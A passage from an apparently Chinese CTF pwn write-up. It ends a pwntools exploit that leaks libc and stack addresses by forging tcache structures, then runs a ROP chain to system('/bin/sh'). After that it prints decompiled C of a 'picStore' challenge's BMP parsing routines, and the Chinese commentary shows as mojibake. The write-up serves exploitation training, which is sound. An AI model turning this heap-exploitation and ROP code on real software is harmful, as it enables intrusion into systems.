uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Stage 3: Leak Stack</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># Make Environ</span><br>FAKE_TCACHE = p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">0</span>)*<span class="hljs-number">0x3f</span> + p64(libc.sym.environ) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x3f</span><br>CHUNKS =  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11c11</span>) + <span class="hljs-string">&#x27;E&#x27;</span>*<span class="hljs-number">0x11c00</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>CHUNKS = FAKE_TCACHE + CHUNKS<br>sl(CHUNKS[::-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># Get Leak</span><br>FAKE_TCACHE = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">0x40</span><br>sl(FAKE_TCACHE[:-<span class="hljs-number">1</span>])<br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>stack_addr ^= (libc.sym.environ&gt;&gt;<span class="hljs-number">12</span>)<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Stage 4: ROP</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>FAKE_TCACHE = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>)<br>sl(FAKE_TCACHE[::-<span class="hljs-number">1</span>])<br>pop_rdi = libc.address + <span class="hljs-number">0x000000000002a3e5</span><br>sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>))<br>ROP_CHAIN = p64(pop_rdi+<span class="hljs-number">1</span>)+p64(pop_rdi)+p64(sh)+p64(pop_rdi+<span class="hljs-number">1</span>)+p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>FAKE_TCACHE = p16(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">0</span>)*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> + p64(stack_addr-<span class="hljs-number">0x148</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x38</span><br>CHUNKS =  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11c11</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x11c00</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>) + <span class="hljs-string">&#x27;P&#x27;</span>*<span class="hljs-number">0x400</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1011</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1000</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x10</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + ROP_CHAIN.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x29</span><br>CHUNKS = FAKE_TCACHE + CHUNKS<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><span class="hljs-comment"># pause()</span><br>sl(CHUNKS)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç£¨åˆ€ä¸è¯¯ç æŸ´å·¥ï¼Œç›´æ¥gdbä¸Šæ‰‹è°ƒé‡åˆ°å¥‡æ€ªçš„ç‚¹ä¹Ÿè¦è®°å¾—çœ‹ç¨‹åºåç¼–è¯‘.jpg</p><p>å®˜æ–¹è§£æ˜¯ Largebinï¼Œæ²¡æ‰“ä½†æ˜¯çŒœä¸€ä¸‹æ€è·¯ï¼Œå¤§æ¦‚å°±æ˜¯ ğŸ‘ Tcache Struct ä½¿ <code>&gt;</code> çš„ä¿©æ¬¡åˆ†é…è½åœ¨å †ä¸Šä¼ªé€ çš„åŒä¸€ Largebin Idx çš„å †å—ä¸Šå¹¶ free æ‰ã€‚æœ€å ğŸ‘ Topchunk size åº”è¯¥å°±èƒ½è§¦å‘ IO æµäº†ã€‚</p><p>è¦æˆ‘è¯´åº”è¯¥æ‹¿ 2.36 æ¥å‡ºé¢˜ (å®˜æ–¹è¿™æ¡è§¦å‘è·¯çº¿æ²¡äº†ï¼‰ï¼Œé€ƒ</p><hr><h2 id="picStore"><a class="header-anchor" href="#picStore">Â¶</a>picStore</h2><p>lua å¡äº†äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼Œå®ç°èœå•çš„å…³é”®ä»£ç å°±æ˜¯ä¸‹é¢çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">lua_pushcclosure(v4, init_store_impl, <span class="hljs-number">0LL</span>);<br>lua_setglobal(v4, <span class="hljs-string">&quot;a_bfBfrMZriK&quot;</span>);<br>lua_pushcclosure(v4, check_inuse_impl, <span class="hljs-number">0LL</span>);<br>lua_setglobal(v4, <span class="hljs-string">&quot;a_IjKn_GF3FE&quot;</span>);<br>lua_pushcclosure(v4, alloc_idx_impl, <span class="hljs-number">0LL</span>);<br>lua_setglobal(v4, <span class="hljs-string">&quot;a_f3_9a7nhRC&quot;</span>);<br>lua_pushcclosure(v4, upload_img_impl, <span class="hljs-number">0LL</span>);<br>lua_setglobal(v4, <span class="hljs-string">&quot;a_1sV7zC5yL_&quot;</span>);<br>lua_pushcclosure(v4, download_img_impl, <span class="hljs-number">0LL</span>);<br>lua_setglobal(v4, <span class="hljs-string">&quot;a_TUBSK2FAhN&quot;</span>);<br>lua_pushcclosure(v4, delete_img_impl, <span class="hljs-number">0LL</span>);<br>lua_setglobal(v4, <span class="hljs-string">&quot;a_8jzNK8OZ4i&quot;</span>);<br>lua_pushcclosure(v4, read_data_impl, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure><p><code>upload()</code> :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">str_unpack</span><span class="hljs-params">(_QWORD *note_array, <span class="hljs-type">int</span> *note_size)</span><br>&#123;<br>  <span class="hljs-type">int</span> iterator; <span class="hljs-comment">// r12d</span><br>  <span class="hljs-type">int</span> note_size_copy; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> note_size_copy_2; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> output_index; <span class="hljs-comment">// [rsp+4h] [rbp-34h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 stack_guard; <span class="hljs-comment">// [rsp+8h] [rbp-30h]</span><br><br>  iterator = <span class="hljs-number">0</span>;<br>  stack_guard = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  *note_array = <span class="hljs-number">0LL</span>;<br>  output_index = <span class="hljs-number">0</span>;<br>  *note_size = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)str_pack_cold(<span class="hljs-built_in">stdin</span>, note_array, &amp;output_index, note_size) )<br>    &#123;<br>      *note_array = <span class="hljs-number">0LL</span>;<br>      *note_size = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ stack_guard;<br>    &#125;<br>    note_size_copy = *note_size;<br>    v4 = <span class="hljs-number">8</span> * output_index;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">8</span> * output_index &gt;= *note_size )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( (note_size_copy != <span class="hljs-number">0x1200</span> * (note_size_copy / <span class="hljs-number">0x1200</span>)) + note_size_copy / <span class="hljs-number">0x1200</span> &lt;= ++iterator )<span class="hljs-comment">// If the unpacked string is too long</span><br>    &#123;<br>      *note_size = v4;<br>      note_size_copy = v4;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  note_size_copy_2 = note_size_copy &gt;&gt; <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">if</span> ( !note_size_copy_2 || *(_BYTE *)(*note_array + note_size_copy_2 - <span class="hljs-number">1LL</span>) )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ stack_guard;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">str_pack_cold</span><span class="hljs-params">(FILE *stream, _QWORD *output_buffer, <span class="hljs-type">int</span> *output_index, <span class="hljs-type">int</span> *output_size)</span><br>&#123;<br>  <span class="hljs-type">int</span> index; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> count; <span class="hljs-comment">// r15d</span><br>  <span class="hljs-type">int</span> width; <span class="hljs-comment">// r14d</span><br>  <span class="hljs-type">unsigned</span> __int16 image_type; <span class="hljs-comment">// ax</span><br>  <span class="hljs-type">int</span> row_index; <span class="hljs-comment">// r15d</span><br>  <span class="hljs-type">int</span> pixel_index; <span class="hljs-comment">// r12d</span><br>  __int64 pixel_value; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> pixel_bit; <span class="hljs-comment">// cl</span><br>  <span class="hljs-type">void</span> *output_data; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> image_size; <span class="hljs-comment">// [rsp+Ch] [rbp-ACh]</span><br>  <span class="hljs-type">int</span> bits_per_pixel; <span class="hljs-comment">// [rsp+10h] [rbp-A8h]</span><br>  <span class="hljs-type">int</span> image_data_size; <span class="hljs-comment">// [rsp+10h] [rbp-A8h]</span><br>  <span class="hljs-type">int</span> image_height; <span class="hljs-comment">// [rsp+28h] [rbp-90h]</span><br>  <span class="hljs-type">char</span> data; <span class="hljs-comment">// [rsp+3Fh] [rbp-79h] BYREF</span><br>  <span class="hljs-type">char</span> header[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-78h] BYREF</span><br>  <span class="hljs-type">int</span> image_width; <span class="hljs-comment">// [rsp+44h] [rbp-74h]</span><br>  <span class="hljs-type">int</span> num_colors; <span class="hljs-comment">// [rsp+48h] [rbp-70h]</span><br>  __int16 file_type; <span class="hljs-comment">// [rsp+6Ah] [rbp-4Eh] BYREF</span><br>  <span class="hljs-type">int</span> image_offset; <span class="hljs-comment">// [rsp+6Ch] [rbp-4Ch]</span><br>  <span class="hljs-type">unsigned</span> __int16 type; <span class="hljs-comment">// [rsp+70h] [rbp-48h]</span><br>  <span class="hljs-type">int</span> header_size; <span class="hljs-comment">// [rsp+74h] [rbp-44h]</span><br>  <span class="hljs-type">unsigned</span> __int64 stack_guard; <span class="hljs-comment">// [rsp+78h] [rbp-40h]</span><br><br>  stack_guard = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  fread(&amp;file_type, <span class="hljs-number">1uLL</span>, <span class="hljs-number">14uLL</span>, stream);<br>  <span class="hljs-keyword">if</span> ( file_type != <span class="hljs-number">0x4D42</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  fread(header, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x28</span>uLL, stream);<br>  index = header_size;<br>  count = <span class="hljs-number">54</span>;<br>  width = image_width;<br>  image_height = image_offset;<br>  bits_per_pixel = num_colors;<br>  <span class="hljs-keyword">if</span> ( header_size &gt; <span class="hljs-number">54</span> )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      fread(&amp;data, <span class="hljs-number">1uLL</span>, <span class="hljs-number">1uLL</span>, stream);<br>      ++count;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( index != count );<br>  &#125;<br>  image_type = type;<br>  <span class="hljs-keyword">if</span> ( *output_size )<br>  &#123;<br>    image_size = type;<br>    <span class="hljs-keyword">goto</span> LABEL_6;<br>  &#125;<br>  image_size = type &amp; <span class="hljs-number">0xFFF8</span>;                   <span class="hljs-comment">// Initialize the output buffer and store the compressed data in it.</span><br>  *output_size = image_size;<br>  output_data = __sysv_signal((<span class="hljs-type">unsigned</span> __int16)(image_type &amp; <span class="hljs-number">0xFFF8</span>) &gt;&gt; <span class="hljs-number">3</span>);<br>  *output_buffer = output_data;<br>  <span class="hljs-keyword">if</span> ( !output_data )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( index &lt; image_height )<br>    &#123;<br>      fread(&amp;data, <span class="hljs-number">1uLL</span>, <span class="hljs-number">1uLL</span>, stream);<br>      ++index;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>LABEL_6:<br>  image_data_size = <span class="hljs-number">3</span> * bits_per_pixel * width; <span class="hljs-comment">// 3 * num_colors * image_width</span><br>  <span class="hljs-keyword">if</span> ( image_data_size &gt; <span class="hljs-number">0</span> &amp;&amp; image_height - index &gt; <span class="hljs-number">0</span> &amp;&amp; image_size )<br>  &#123;                                             <span class="hljs-comment">// image_height:image_offset</span><br>                                                <span class="hljs-comment">// image_size:malloc_size</span><br>                                                <span class="hljs-comment">// index:header_size</span><br>    row_index = <span class="hljs-number">0</span>;<br>    pixel_index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      fread(&amp;data, <span class="hljs-number">1uLL</span>, <span class="hljs-number">1uLL</span>, stream);<br>      pixel_value = *output_index;<br>      ++pixel_index;<br>      pixel_bit = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( (data &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>        pixel_bit = <span class="hljs-number">1</span> &lt;&lt; row_index;<br>      <span class="hljs-keyword">if</span> ( row_index + <span class="hljs-number">8</span> * (<span class="hljs-type">int</span>)pixel_value &lt;= *output_size )<br>        *(_BYTE *)(*output_buffer + pixel_value) = pixel_bit | *(_BYTE *)(*output_buffer + pixel_value) &amp; ~(<span class="hljs-type">unsigned</span> __int8)(<span class="hljs-number">1</span> &lt;&lt; row_index);<br>      <span class="hljs-keyword">if</span> ( row_index == <span class="hljs-number">7</span> )<br>      &#123;<br>        ++*output_index;<br>        row_index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> ( pixel_index == image_data_size )<br>        &#123;<br>LABEL_20:<br>          index += pixel_index;<br>          <span class="hljs-keyword">goto</span> LABEL_21;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        ++row_index;<br>        <span class="hljs-keyword">if</span> ( pixel_index == image_data_size )<br>          <span class="hljs-keyword">goto</span> LABEL_20;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( pixel_index == image_height - index )<br>      &#123;<br>        index = image_height;<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( pixel_index == image_size )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( pixel_index != <span class="hljs-number">0x1200</span> );<br>    index += <span class="hljs-number">0x1200</span>;<br>  &#125;<br>LABEL_21:<br>  <span class="hljs-keyword">if</span> ( index &lt; image_height )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      fread(&amp;data, <span class="hljs-number">1uLL</span>, <span class="hljs-number">1uLL</span>, stream);<br>      ++index;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( image_height != index );<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>download()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">luaD_hook</span><span class="hljs-params">(<span class="hljs-type">char</span> *note_array, <span class="hljs-type">int</span> note_size)</span><br>&#123;<br>  <span class="hljs-type">int</span> CHUNK_NNUM; <span class="hljs-comment">// ebp</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> note_size_0; <span class="hljs-comment">// [rsp+4h] [rbp-44h] BYREF</span><br>  __int64 note_array_0; <span class="hljs-comment">// [rsp+8h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+14h] [rbp-34h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  note_array_0 = (__int64)note_array;<br>  note_size_0 = note_size;<br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v7 = <span class="hljs-number">0</span>;<br>  CHUNK_NNUM = note_size / <span class="hljs-number">4608</span> - ((note_size % <span class="hljs-number">4608</span> == <span class="hljs-number">0</span>) - <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( CHUNK_NNUM &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != CHUNK_NNUM; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)str_pack(<span class="hljs-built_in">stdout</span>, &amp;note_array_0, &amp;v7, &amp;note_size_0) )<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">str_pack</span><span class="hljs-params">(FILE *stream, __int64 *note, <span class="hljs-type">int</span> *current_position, <span class="hljs-type">int</span> *note_size)</span><br>&#123;<br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// ebx</span><br>  __int64 v9; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// r14d</span><br>  __int64 v11; <span class="hljs-comment">// rcx</span><br>  __int64 v12; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">char</span> v13; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// edx</span><br>  _BYTE *v15; <span class="hljs-comment">// rbx</span><br>  _BYTE *v16; <span class="hljs-comment">// rbp</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v18; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span><br>  <span class="hljs-type">bool</span> v19; <span class="hljs-comment">// [rsp+7h] [rbp-89h]</span><br>  <span class="hljs-type">char</span> v20; <span class="hljs-comment">// [rsp+17h] [rbp-79h] BYREF</span><br>  __int128 v21; <span class="hljs-comment">// [rsp+18h] [rbp-78h] BYREF</span><br>  __int128 v22; <span class="hljs-comment">// [rsp+28h] [rbp-68h]</span><br>  __int64 v23; <span class="hljs-comment">// [rsp+38h] [rbp-58h]</span><br>  __int16 ptr; <span class="hljs-comment">// [rsp+42h] [rbp-4Eh] BYREF</span><br>  <span class="hljs-type">int</span> v25; <span class="hljs-comment">// [rsp+44h] [rbp-4Ch]</span><br>  __int16 v26; <span class="hljs-comment">// [rsp+48h] [rbp-48h]</span><br>  __int16 v27; <span class="hljs-comment">// [rsp+4Ah] [rbp-46h]</span><br>  <span class="hljs-type">int</span> v28; <span class="hljs-comment">// [rsp+4Ch] [rbp-44h]</span><br>  <span 